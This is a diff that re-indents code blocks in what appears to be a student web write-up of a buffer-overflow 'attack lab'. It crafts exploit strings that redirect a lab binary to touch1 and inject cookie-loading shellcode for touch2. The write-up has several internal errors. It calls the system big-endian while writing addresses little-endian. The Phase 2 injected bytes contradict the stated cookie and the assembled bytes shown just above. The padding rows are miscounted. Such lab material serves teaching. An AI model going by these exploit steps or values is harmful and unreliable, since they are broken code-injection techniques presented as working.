@@ -105,11 +105,11 @@
             <pre><code>0000000000401760 <touch1>:</code></pre>
             <p>Now we can use this information to craft our exploit string. When you write the bytes, you need to consider the byte order. My system is a big-endian so the bytes go in order. I put the following into a file called 'phase1.txt'</p> 
             <pre><code>00 00 00 00 00 00 00 00 00   /* buffer - 40 bytes*/
-                00 00 00 00 00 00 00 00 00
-                00 00 00 00 00 00 00 00 00
-                00 00 00 00 00 00 00 00 00
-                00 00 00 00 00 00 00 00 00
-                4c 18 40 00 00 00 00 00 00   /*overflow w/ address bwhahah*/</code></pre>
+00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00
+4c 18 40 00 00 00 00 00 00   /*overflow w/ address bwhahah*/</code></pre>
             <p>So that the program understands my BoF string, I ran the text file I made, phase1.txt in hex2raw and generated a raw exploit string.</p>
             <pre><code>./hex2raw < phase1.txt > raw-phase1.txt</code></pre>
             <p>With all of these pieces, I ran the exploit string against the target binary, ctarget</p>
@@ -126,10 +126,10 @@
             The address of my touch2 is 0x401878. However, this time we also need the address of the cookie we are passing to touch2. With a bit more searching, I found my cookieaddr is 0x10ee1fdf
             Now we can craft our exploit string. I put the following into a file called 'phase2.s'</p>
             <pre><code>movq $0x10ee1fdf, %rdi
-                retq</code></pre>
+retq</code></pre>
             <p>Similar to last time, so that the application understands the exploit string, I converted the above assembly into byte code:</p>
             <pre><code>.gcc -c phase2.s
-                objdump -d phase2.o  > phase2.d </code></pre>
+objdump -d phase2.o  > phase2.d </code></pre>
             <p>The byte code I generated was </p>
             <pre><code>48 c7 c7 df 1f ee 10
 c3</code></pre>
@@ -141,12 +141,12 @@ c3</code></pre>
             <p>Whatever address is returned first is the rsp bytes. In my case this was 0x55656ef8
             We finally have everything we need to make our exploit code! I made a text file called phase2.txt, buildingn off of what we found in Phase1 and in this phase.</p>
             <pre><code>48 c7 c7 70 4b 4b 43 c3 00 /*cookie*/
-                00 00 00 00 00 00 00 00 00 /* 40 bytes of padding*/
-                00 00 00 00 00 00 00 00 00
-                00 00 00 00 00 00 00 00 00
-                00 00 00 00 00 00 00 00 00
-                55 65 6e f8 00 00 00 00 00 /* rsp address */
-                40 18 78 00 00 00 00 00 00 /* touch2 address */</code></pre>
+00 00 00 00 00 00 00 00 00 /* 40 bytes of padding*/
+00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00
+55 65 6e f8 00 00 00 00 00 /* rsp address */
+40 18 78 00 00 00 00 00 00 /* touch2 address */</code></pre>
             <p>So that the application understands the exploit string, I ran the text file I made, phase2.txt in hex2raw and generated a raw exploit string.</p>
             <pre><code>./hex2raw < phase2.txt > raw-phase2.txt</code></pre>
             <p>With all of these pieces, I ran the exploit string against the target binary, ctarget</p>
